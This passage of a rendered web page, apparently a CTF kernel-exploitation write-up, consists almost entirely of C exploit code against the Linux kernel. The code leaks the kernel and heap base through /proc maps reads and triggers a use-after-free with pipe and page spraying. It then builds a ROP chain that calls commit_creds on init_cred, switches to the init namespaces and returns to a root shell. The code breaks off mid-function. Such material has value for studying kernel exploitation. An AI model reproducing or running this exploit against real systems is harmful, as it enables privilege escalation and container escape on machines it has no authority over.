class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;a3kernel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/membarrier.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_MIN_PARTIAL          5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_OBJECT_SIZE          256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_ORDER                0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_OBJS_PER_SLAB        16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_SPRAY_PAGE_NUM       0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAPLE_NODE_SPRAY_PER_PAGE_NUM   MAPLE_NODE_OBJS_PER_SLAB+1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEEP_PATH_LENGTH                0x60000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM                  0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_BASE_LEAK_OFFSET         0xe08e00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEAP_BASE_LEAK_OFFSET           0x1814b38</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_PAGES_NUM                 0x30000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROP_OFFSET                      0x73c2ae40</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    LEAK_KERNEL_BASE,<br>    LEAK_HEAP_BASE,<br>    UAFBR_TO_ROOT,<br>    DETECT_FAKE_STACK,<br>&#125;<span class="hljs-type">status_t</span>;<br><br><br><span class="hljs-type">void</span>*   new_stack = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">pid_t</span>   maple_node_spray_pids[MAPLE_NODE_SPRAY_PAGE_NUM][MAPLE_NODE_SPRAY_PER_PAGE_NUM];<br><span class="hljs-type">pid_t</span>   maple_node_uaf_pids[<span class="hljs-number">3</span>][MAPLE_NODE_SPRAY_PER_PAGE_NUM];<br><span class="hljs-type">char</span>    buffer[DEEP_PATH_LENGTH*<span class="hljs-number">12</span>];<br><span class="hljs-type">int</span>     pipefd[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span>     pipe_spray_pids[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span>  fake_stacks[SPRAY_PAGES_NUM];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_stack</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> flags = MAP_PRIVATE | MAP_ANONYMOUS<br>                | MAP_GROWSDOWN | MAP_STACK;<br>    new_stack = mmap(<br>        (<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead0000</span>,<br>        <span class="hljs-number">0x1000</span>,<br>        PROT_READ | PROT_WRITE,<br>        flags,<br>        <span class="hljs-number">-1</span>, <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span>(new_stack == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap stack failed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack top 1: %p\n&quot;</span>, new_stack);<br><br>    new_stack = mmap(<br>        (<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead2000</span>,<br>        <span class="hljs-number">0x1000</span>,<br>        PROT_READ | PROT_WRITE,<br>        flags,<br>        <span class="hljs-number">-1</span>, <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span>(new_stack == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap stack failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack top 2: %p\n&quot;</span>, new_stack);<br>    usleep(<span class="hljs-number">100000</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">simple_child</span><span class="hljs-params">()</span>&#123;<br>    sleep(<span class="hljs-number">100000</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_deep_path</span><span class="hljs-params">(<span class="hljs-type">char</span> *name, <span class="hljs-type">void</span> *addrs[], <span class="hljs-type">int</span> num_addrs)</span>&#123;<br><br>    chdir(<span class="hljs-string">&quot;/tmp&quot;</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-type">bool</span> exist = (stat(name, &amp;st) == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;DEEP_PATH_LENGTH<span class="hljs-number">-1</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(!exist)<br>            mkdir(name, <span class="hljs-number">0777</span>);<br>        chdir(name);<br>    &#125;<br><br>    <span class="hljs-type">int</span> fd = open(name, O_RDWR | O_CREAT | O_TRUNC, <span class="hljs-number">0644</span>);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(truncate(name, <span class="hljs-number">0x1000</span>) == <span class="hljs-number">-1</span>)&#123;<br>        perror(<span class="hljs-string">&quot;truncate&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;num_addrs; i++)&#123;<br>        <span class="hljs-type">void</span> *tmp = mmap(<br>            addrs[i],<br>            <span class="hljs-number">0x1000</span>,<br>            PROT_READ | PROT_WRITE,<br>            MAP_PRIVATE,<br>            fd, <span class="hljs-number">0</span><br>        );<br>        <span class="hljs-keyword">if</span>(tmp == MAP_FAILED)&#123;<br>            perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Deep path has been created.\033[0m&quot;</span>);<br><br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span>&#123;<br>    close(pipefd[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);<br>    close(pipefd[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br>    close(pipefd[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]);<br>    close(pipefd[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;PIPE_SPRAY_NUM; i++)&#123;<br>        close(pipe_spray_pids[i][<span class="hljs-number">0</span>]);<br>        close(pipe_spray_pids[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_worker</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">status_t</span> status)</span>&#123;<br><br>    <span class="hljs-type">char</span> c;<br>    read(pipefd[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-string">&quot;/proc/%d/maps&quot;</span>, pid);<br><br>    <span class="hljs-type">int</span> fd = open(buffer, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)&#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    read(fd, buffer, DEEP_PATH_LENGTH*<span class="hljs-number">11</span>+<span class="hljs-number">100</span>*<span class="hljs-number">6</span>);<br><br>    write(pipefd[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to read maps info.\033[0m&quot;</span>);<br><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span>((count = read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer))) &gt; <span class="hljs-number">0</span>);<br><br>    close(fd);<br><br>    wait(<span class="hljs-literal">NULL</span>);<br><br>    cleanup();<br><br>    <span class="hljs-type">char</span> *leak = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">switch</span>(status)&#123;<br>        <span class="hljs-keyword">case</span> LEAK_HEAP_BASE:<br>            leak = <span class="hljs-built_in">strstr</span>(buffer, <span class="hljs-string">&quot;ffff&quot;</span>);<br>            <span class="hljs-keyword">if</span>(leak)&#123;<br>                <span class="hljs-type">char</span> *end = <span class="hljs-built_in">strchr</span>(leak, <span class="hljs-string">&#x27; &#x27;</span>);<br>                *end = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>                <span class="hljs-type">size_t</span> heapbase = strtoull(leak, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leaked heap address: %lx\n&quot;</span>, heapbase);<br><br>                <span class="hljs-keyword">return</span> heapbase;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> LEAK_KERNEL_BASE:<br>            leak = <span class="hljs-built_in">strstr</span>(buffer, <span class="hljs-string">&quot;ffffffff&quot;</span>);<br>            <span class="hljs-keyword">if</span>(leak)&#123;<br>                <span class="hljs-type">char</span> *end = <span class="hljs-built_in">strchr</span>(leak, <span class="hljs-string">&#x27; &#x27;</span>);<br>                *end = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>                kernel_base = strtoull(leak, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>) - KERNEL_BASE_LEAK_OFFSET;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leaked kernel address: %lx\n&quot;</span>, kernel_base);<br><br>                <span class="hljs-keyword">return</span> kernel_base;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <br>        <span class="hljs-keyword">case</span> DETECT_FAKE_STACK:<br>            leak = <span class="hljs-built_in">strstr</span>(buffer, <span class="hljs-string">&quot;cafecafecafecafe&quot;</span>);<br>            <span class="hljs-type">int</span> ret;<br>            <span class="hljs-keyword">if</span>(!leak)    ret = <span class="hljs-number">0xff</span>;<br>            <span class="hljs-keyword">else</span>         ret = <span class="hljs-number">0xcc</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Detected fake stack: %s\n&quot;</span>, leak ? <span class="hljs-string">&quot;Yes&quot;</span> : <span class="hljs-string">&quot;No&quot;</span>);<br>            <span class="hljs-keyword">return</span> ret;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_uaf</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br><br>    <span class="hljs-type">size_t</span> *p = (<span class="hljs-type">size_t</span> *)buffer;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0xcafdffff</span>;<br>    *p++ = <span class="hljs-number">0xcafe0fff</span>;<br>    *p++ = <span class="hljs-number">0xcafe1fff</span>;<br>    *p++ = <span class="hljs-number">0xcafe2fff</span>;<br>    *p++ = <span class="hljs-number">0xdeacffff</span>;<br>    *p++ = <span class="hljs-number">0xdead0fff</span>;<br>    *p++ = <span class="hljs-number">0xdead1fff</span>;<br>    *p++ = <span class="hljs-number">0xdead2fff</span>;<br>    *p++ = <span class="hljs-number">0xffffffffffffffff</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">9</span>; i++)<br>        *p++ = addr;<br><br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">0</span>;<br>    *p++ = <span class="hljs-number">9</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> *p = (<span class="hljs-type">size_t</span> *)(buffer + <span class="hljs-number">0x100</span>); p &lt; (<span class="hljs-type">size_t</span> *)(buffer + <span class="hljs-number">0x1000</span>); p+=<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">memcpy</span>(p, buffer, <span class="hljs-number">0x100</span>);<br><br><br>    write(pipefd[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">1</span>);<br><br>    read(pipefd[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>], buffer, <span class="hljs-number">1</span>);<br><br>    *(<span class="hljs-type">size_t</span> *)(new_stack - <span class="hljs-number">8</span>) = <span class="hljs-number">0xdeadbeef</span>;<br><br>    syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;PIPE_SPRAY_NUM; i++)&#123;<br>        write(pipe_spray_pids[i][<span class="hljs-number">1</span>], buffer, <span class="hljs-number">0x1000</span>);<br>    &#125;<br><br>    <span class="hljs-type">char</span> *uaf_banner = <span class="hljs-string">&quot;[*] Triggered UAF.\n&quot;</span>;<br>    write(<span class="hljs-number">1</span>, uaf_banner, <span class="hljs-built_in">strlen</span>(uaf_banner));<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rop</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr, <span class="hljs-type">size_t</span> data)</span>&#123;<br>    *(<span class="hljs-type">size_t</span> *)addr = data;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_pages</span><span class="hljs-params">()</span> &#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;SPRAY_PAGES_NUM; i++)&#123;<br>        fake_stacks[i] = mmap(<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-number">0x1000</span>,<br>            PROT_READ | PROT_WRITE,<br>            MAP_PRIVATE | MAP_ANONYMOUS,<br>            <span class="hljs-number">-1</span>, <span class="hljs-number">0</span><br>        );<br>        <span class="hljs-keyword">if</span>(fake_stacks[i] == MAP_FAILED)&#123;<br>            perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        *(<span class="hljs-type">size_t</span> *)fake_stacks[i] = <span class="hljs-number">0xcafecafecafecafe</span>;<br>    &#125;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_pages_rop</span><span class="hljs-params">(<span class="hljs-type">size_t</span> heap_base, <span class="hljs-type">size_t</span> kernel_base)</span>&#123;<br>    <br>    save_status();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff8126326a &lt;+26&gt;:	mov    rax,QWORD PTR [rbx+0x58]</span><br><span class="hljs-comment">0xffffffff8126326e &lt;+30&gt;:	lea    r15,[rbx+0x28]</span><br><span class="hljs-comment">0xffffffff81263272 &lt;+34&gt;:	mov    rdi,rbx</span><br><span class="hljs-comment">0xffffffff81263275 &lt;+37&gt;:	xor    r13d,r13d</span><br><span class="hljs-comment">0xffffffff81263278 &lt;+40&gt;:	mov    rsi,r15</span><br><span class="hljs-comment">0xffffffff8126327b &lt;+43&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="hljs-comment">0xffffffff8126327e &lt;+46&gt;:	call   0xffffffff820030c0 &lt;__x86_indirect_thunk_array&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">0xffffffff81b82211 : push rsi ; jmp qword ptr [rsi + 0x66]</span><br><span class="hljs-comment">0xffffffff81114e08 : pop rsp; ret;</span><br><span class="hljs-comment">0xffffffff81021465 : pop rdi; ret;</span><br><span class="hljs-comment">0xffffffff81b06617 : mov rsi, rsp ; mov rdi, rbp ; call 0xffffffff820030c0</span><br><span class="hljs-comment">0xffffffff81246344 : pop rax; ret;</span><br><span class="hljs-comment">0xffffffff81055161 : pop rsi ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret</span><br><span class="hljs-comment">0xffffffff81127821 : pop rbx ; pop rdx ; ret</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// init_cred                0xffffffff828519c0</span><br><span class="hljs-comment">// commit_creds             0xffffffff8109b780</span><br><span class="hljs-comment">// m_stop                   0xffffffff812b1230</span><br><span class="hljs-comment">// common_interrupt_return  0xffffffff81e00ed0</span><br><span class="hljs-comment">// __rcu_read_lock          0xffffffff810e6db0</span><br><span class="hljs-comment">// __rcu_read_unlock        0xffffffff810ea8c0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RDX_RET     (kernel_base + 0x127821)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_RET             (kernel_base + 0x246344)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RBP_CALL_RAX    (kernel_base + 0xb06617)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONTROL_RSI             (kernel_base + 0x26326a)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET             (kernel_base + 0x21465)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_JMP_RSI_0x66   (kernel_base + 0xb82211)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET             (kernel_base + 0x114e08)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED               (kernel_base + 0x18519c0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS            (kernel_base + 0x9b780)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> M_STOP                  (kernel_base + 0x2b1230)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMON_INTERRUPT_RETURN (kernel_base + 0xe00120)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_5_RET               (kernel_base + 0x55161)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES  (kernel_base + 0x99cd0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET             (kernel_base + 0xaa10d)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_NSPROXY            (kernel_base + 0x18517a0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RCU_READ_LOCK           (kernel_base + 0xe6db0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RCU_READ_UNLOCK         (kernel_base + 0xea8c0)</span><br><br>    <span class="hljs-type">size_t</span> addr = (<span class="hljs-type">size_t</span>)buffer;<br><br>    <span class="hljs-built_in">memcpy</span>(buffer, <span class="hljs-string">&quot;misakimei&quot;</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">// SKIP 0x70!!!</span><br>    <span class="hljs-comment">// set ops to control rsi</span><br>    rop(addr+<span class="hljs-number">0x60</span>, heap_base+<span class="hljs-number">0xf00</span>);<br>    rop(addr+<span class="hljs-number">0xf00</span>+<span class="hljs-number">0x60</span>, CONTROL_RSI);<br><br>    <span class="hljs-comment">// control rsi</span><br>    rop(addr+<span class="hljs-number">0x58</span>, heap_base+<span class="hljs-number">0xf10</span>);<br>    rop(addr+<span class="hljs-number">0xf10</span>, PUSH_RSI_JMP_RSI_0x66);<br>    <br>    <span class="hljs-comment">// push fake stack</span><br>    <span class="hljs-comment">// 0x8e-0x96</span><br>    rop(addr+<span class="hljs-number">0x28</span>+<span class="hljs-number">0x66</span>, POP_RSP_RET);<br><br>    <span class="hljs-comment">// rop</span><br>    rop(addr+<span class="hljs-number">0x28</span>, POP_RDI_RET);<br>    rop(addr+<span class="hljs-number">0x30</span>, INIT_CRED);<br>    rop(addr+<span class="hljs-number">0x38</span>, COMMIT_CREDS);<br>    rop(addr+<span class="hljs-number">0x40</span>, POP_RAX_RET);<br>    rop(addr+<span class="hljs-number">0x48</span>, M_STOP+<span class="hljs-number">1</span>);<br>    rop(addr+<span class="hljs-number">0x50</span>, POP_RBX_POP_RDX_RET);<br>    <span class="hljs-comment">// skip 58 60</span><br>    rop(addr+<span class="hljs-number">0x68</span>, POP_RDI_RET);<br>    <span class="hljs-comment">// skip 70</span><br>    rop(addr+<span class="hljs-number">0x78</span>, MOV_RDI_RBP_CALL_RAX);<br>    rop(addr+<span class="hljs-number">0x80</span>, POP_5_RET);<br>    <span class="hljs-comment">// skip 88 90 98 a0 a8</span><br>    <br>    rop(addr+<span class="hljs-number">0xb0</span>, RCU_READ_LOCK);<br>    rop(addr+<span class="hljs-number">0xb8</span>, RCU_READ_UNLOCK);<br>    rop(addr+<span class="hljs-number">0xc0</span>, POP_RSI_RET);<br>    rop(addr+<span class="hljs-number">0xc8</span>, INIT_NSPROXY);<br>    rop(addr+<span class="hljs-number">0xd0</span>, SWITCH_TASK_NAMESPACES);<br>    rop(addr+<span class="hljs-number">0xd8</span>, COMMON_INTERRUPT_RETURN);<br><br>    rop(addr+<span class="hljs-number">0xe0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r15</span><br>    rop(addr+<span class="hljs-number">0xe8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r14</span><br>    rop(addr+<span class="hljs-number">0xf0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r13</span><br>    rop(addr+<span class="hljs-number">0xf8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r12</span><br>    rop(addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// rbp</span><br>    rop(addr+<span class="hljs-number">0x108</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// rbx</span><br>    rop(addr+<span class="hljs-number">0x110</span>, user_rflags); <span class="hljs-comment">// r11</span><br>    rop(addr+<span class="hljs-number">0x118</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r10</span><br>    rop(addr+<span class="hljs-number">0x120</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r9</span><br>    rop(addr+<span class="hljs-number">0x128</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// r8</span><br>    rop(addr+<span class="hljs-number">0x130</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// rax</span><br>    rop(addr+<span class="hljs-number">0x138</span>, get_root_shell); <span class="hljs-comment">// rcx</span><br>    rop(addr+<span class="hljs-number">0x140</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// rdx</span><br>    rop(addr+<span class="hljs-number">0x148</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// rsi</span><br><br>    rop(addr+<span class="hljs-number">0x150</span>+<span class="hljs-number">0x28</span>, buffer+<span class="hljs-number">0x2000</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;SPRAY_PAGES_NUM; i++)&#123;<br>        <span class="hljs-built_in">memcpy</span>(fake_stacks[i], buffer, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">detect_fake_stack</span><span class="hljs-params">(<span class="hljs-type">char</span> *argv[])</span>&#123;<br><br>    <span class="hljs-type">size_t</span> heapbase = strtoull(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-type">size_t</span> kernelbase = strtoull(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br><br>    spray_pages();<br><br>    <span class="hljs-type">size_t</span> start = heapbase-ROP_OFFSET<span class="hljs-number">-0x1000000</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> addr = start; addr &lt; start+<span class="hljs-number">0x1000000</span>; addr+=<span class="hljs-number">0x1000</span>)&#123;<br><br>        <span class="hljs-type">pid_t</span> pid = fork();<br><br>        <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-string">&quot;%lx&quot;</span>, addr);<br>            execve(argv[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> *[])&#123;argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], buffer, <span class="hljs-literal">NULL</span>&#125;, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">int</span> status;<br>            <span class="hljs-type">pid_t</span> ret = waitpid(pid, &amp;status, <span class="hljs-number">0</span>);<br><br>            <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)&#123;<br>                perror(<span class="hljs-string">&quot;waitpid&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Tested address: 0x%lx, return code: %x\n&quot;</span>, addr, WEXITSTATUS(status));<br>                <span class="hljs-keyword">if</span>(WEXITSTATUS(status) == <span class="hljs-number">0xcc</span>)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found fake stack at 0x%lx\n&quot;</span>, addr);<br><br>                    spray_pages_rop(addr, kernelbase);<br><br>                    <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-string">&quot;%lx&quot;</span>, addr);<br>                    <br>                    ret = fork();<br>                    <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">0</span>)&#123;<br>                        execve(argv[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> *[])&#123;argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], buffer, buffer, <span class="hljs-literal">NULL</span>&#125;, <span class="hljs-literal">NULL</span>);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        wait(<span class="hljs-literal">NULL</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                    <br>                &#125;<br>            &#125;<br>        